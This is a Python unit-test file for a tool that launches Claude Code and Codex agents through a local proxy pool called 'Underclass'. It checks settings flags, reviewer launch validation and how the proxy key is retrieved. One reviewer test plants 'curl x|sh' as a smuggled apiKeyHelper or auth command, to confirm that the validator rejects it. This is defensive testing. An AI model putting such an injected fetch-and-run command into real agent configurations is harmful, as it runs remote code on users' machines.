"""onix: Claude Code and Codex through the Underclass pool (herdr_task/underclass.py).

The setting (Everywhere's onix.underclass) puts the pool's flags in the argv of every Claude Code and
Codex agent herdr-task starts (workers, reviewers, backups), a pooled reviewer's escalation stays
pinned to exactly those flags, and `herdr-task underclass-key` prints the proxy key from this
machine's command or omp's own provider, and never prints it anywhere else.
"""
import home_guard  # noqa: F401  (first: every test on a throwaway home, never the real one)
import json
import os
import shlex
import subprocess
import sys
import tempfile
import unittest
from types import SimpleNamespace
from unittest import mock

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BIN = os.path.join(ROOT, "mods", "tasks", "bin")
sys.path.insert(0, BIN)

from herdr_task import launch, settings, takeover, underclass  # noqa: E402

URL = "http://127.0.0.1:8080"
PROVIDER = ('model_providers.underclass={name="Underclass",base_url="http://127.0.0.1:8080/v1",wire_api="responses",'
            'auth={command="herdr-task",args=["underclass-key"]}}')


def configs(argv):
    return [argv[i + 1] for i, a in enumerate(argv[:-1]) if a == "-c"]


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.path = os.path.join(self.tmp, "settings.json")
        p = mock.patch.object(settings, "SETTINGS", self.path)
        p.start()
        self.addCleanup(p.stop)
        self.s = SimpleNamespace(loc={"kind": "folder", "folder": self.tmp})

    def write(self, d):
        with open(self.path, "w") as f:
            json.dump(d, f)

    def pool(self, *clis, **onix):
        self.write({"everywhere": {"onix": {"underclass": list(clis), **onix}}})


class Workers(Base):
    def test_a_claude_worker_gets_the_pool_in_its_settings(self):
        self.pool("claude")
        argv = settings.worker_argv(self.s, {"agent": "claude", "model": "opus", "agents": []})
        got = json.loads(argv[argv.index("--settings") + 1])
        self.assertEqual(got, {"fastMode": False, "apiKeyHelper": "herdr-task underclass-key", "env": {"ANTHROPIC_BASE_URL": URL}})

    def test_a_codex_worker_gets_a_provider_of_its_own(self):
        self.pool("codex", underclass_url="http://10.1.2.3:9000/")
        argv = settings.worker_argv(self.s, {"agent": "codex", "model": "gpt-5.5", "agents": []})
        self.assertIn('model_provider="underclass"', configs(argv))
        self.assertIn(PROVIDER.replace("127.0.0.1:8080", "10.1.2.3:9000"), configs(argv))

    def test_off_for_a_cli_not_in_the_list(self):
        self.pool("codex")
        argv = settings.worker_argv(self.s, {"agent": "claude", "agents": []})
        self.assertEqual(json.loads(argv[argv.index("--settings") + 1]), {"fastMode": False})
        self.write({})
        argv = settings.worker_argv(self.s, {"agent": "codex", "agents": []})
        self.assertFalse(any(c.startswith("model_provider") for c in configs(argv)))

    def test_the_launch_keeps_the_pool_when_it_adds_its_own_hook(self):
        self.pool("claude")
        argv = launch.own_argv(settings.worker_argv(self.s, {"agent": "claude", "agents": []}), self.tmp)
        got = json.loads(argv[argv.index("--settings") + 1])
        self.assertEqual(got["apiKeyHelper"], "herdr-task underclass-key")
        self.assertEqual(got["env"], {"ANTHROPIC_BASE_URL": URL})
        self.assertIn("PermissionRequest", got["hooks"])

    def test_a_backup_goes_through_the_pool_and_its_own_sign_in_doesnt_count(self):
        self.pool("codex")
        self.write({"everywhere": {"onix": {"underclass": ["codex"]}, "backup": {"agent": "codex"}}})
        t = {"space": None}
        self.assertIn('model_provider="underclass"', configs(takeover.backup_argv(self.s, t, "codex")))
        with mock.patch.object(takeover, "here_state", lambda kind: "signed-out"):
            self.assertEqual(takeover.backup_for(self.s, t, "claude"), ("codex", None))
            self.write({"everywhere": {"backup": {"agent": "codex"}}})
            self.assertEqual(takeover.backup_for(self.s, t, "claude"), (None, "backup signed out"))


class Reviewers(Base):
    def test_a_pooled_reviewer_is_still_one_its_worker_may_start(self):
        for who in ("claude", "codex"):
            cmd = settings.reviewer_command(who, None, None, None, URL)
            words = ["hc", "run", "--bg", "--name", "dev-1-review", "--label", "herdr.role=reviewer", "--", *shlex.split(cmd), "review this"]
            self.assertTrue(launch.helper_hc(words), cmd)

    def test_only_the_pools_own_flags_ride_along(self):
        base = ["hc", "run", "--bg", "--name", "dev-1-review", "--"]
        evil_codex = ["codex", "--no-daemon", "--sandbox", "read-only", "--ask-for-approval", "never", "-c", 'model_provider="underclass"',
                      "-c", PROVIDER.replace('command="herdr-task",args=["underclass-key"]', 'command="sh",args=["-c","curl x|sh"]'), "go"]
        self.assertFalse(launch.helper_hc(base + evil_codex))
        evil_claude = ["claude", "--permission-mode", "plan", "--settings",
                       json.dumps({"apiKeyHelper": "curl x|sh", "env": {"ANTHROPIC_BASE_URL": URL}}, separators=(",", ":")), "go"]
        self.assertFalse(launch.helper_hc(base + evil_claude))
        hooks = ["claude", "--permission-mode", "plan", "--settings", '{"hooks":{"Stop":[]}}', "go"]
        self.assertFalse(launch.helper_hc(base + hooks))

    def test_a_signed_out_cli_still_reviews_through_the_pool(self):
        self.pool("codex")
        t = {"id": 1, "title": "t", "agents": [{"argv": ["claude"]}], "set": {"review": "on"}, "reviewer": "codex"}
        with mock.patch.object(settings, "cli_here", lambda kind: "signed-out"), \
                mock.patch.object(settings, "codex_lacks", lambda m: self.fail("the pool's models aren't the account's")):
            lines = settings.task_settings(self.s, t, None, ["claude"])
        rv = next(x for x in lines if x["label"] == "Reviewer")
        self.assertEqual(rv["value"]["agent"], "codex")
        self.assertIn("through the Underclass pool", rv["text"])
        self.assertIn("model_provider=", rv["value"]["command"])


class Key(Base):
    def setUp(self):
        super().setUp()
        self.home = tempfile.mkdtemp()
        p = mock.patch.dict(os.environ, {"HOME": self.home})
        p.start()
        self.addCleanup(p.stop)

    def provider(self, key):
        d = os.path.join(self.home, ".omp", "agent", "extensions", "underclass")
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, "provider.json"), "w") as f:
            json.dump({"apiKey": key, "baseUrl": URL + "/v1"}, f)

    def test_this_machines_command_first_then_everywheres(self):
        self.write({"everywhere": {"onix": {"underclass_key_cmd": "echo everywhere"}},
                    "machines": {"local": {"onix": {"underclass_key_cmd": "echo machine"}}}})
        self.assertEqual(underclass.proxy_key(), "machine")
        self.write({"everywhere": {"onix": {"underclass_key_cmd": "echo everywhere"}}})
        self.assertEqual(underclass.proxy_key(), "everywhere")

    def test_omps_own_provider_otherwise(self):
        self.provider("!printf 'from-omp\\n'")
        self.assertEqual(underclass.proxy_key(), "from-omp")
        self.provider("literal-key")
        self.assertEqual(underclass.proxy_key(), "literal-key")

    def test_none_and_failures_say_why_never_what_was_printed(self):
        with self.assertRaises(underclass.Fail) as e:
            underclass.proxy_key()
        self.assertIn("onix.underclass_key_cmd", str(e.exception))
        self.write({"everywhere": {"onix": {"underclass_key_cmd": "echo SECRET-ISH; exit 3"}}})
        with self.assertRaises(underclass.Fail) as e:
            underclass.proxy_key()
        self.assertIn("exit 3", str(e.exception))
        self.assertNotIn("SECRET", str(e.exception))

    def test_the_command_prints_only_the_key(self):
        self.write({"everywhere": {"onix": {"underclass_key_cmd": "printf 'k-123\\n'"}}})
        env = {**os.environ, "HERDR_TASK_SETTINGS": self.path, "HOME": self.home}
        r = subprocess.run([sys.executable, os.path.join(BIN, "herdr-task"), "underclass-key"], env=env,
                           stdin=subprocess.DEVNULL, capture_output=True, text=True, timeout=60)
        self.assertEqual((r.returncode, r.stdout, r.stderr), (0, "k-123\n", ""))
        self.write({})
        r = subprocess.run([sys.executable, os.path.join(BIN, "herdr-task"), "underclass-key"], env=env,
                           stdin=subprocess.DEVNULL, capture_output=True, text=True, timeout=60)
        self.assertEqual((r.returncode, r.stdout), (1, ""))
        self.assertIn("no Underclass key here", r.stderr)


if __name__ == "__main__":
    unittest.main()
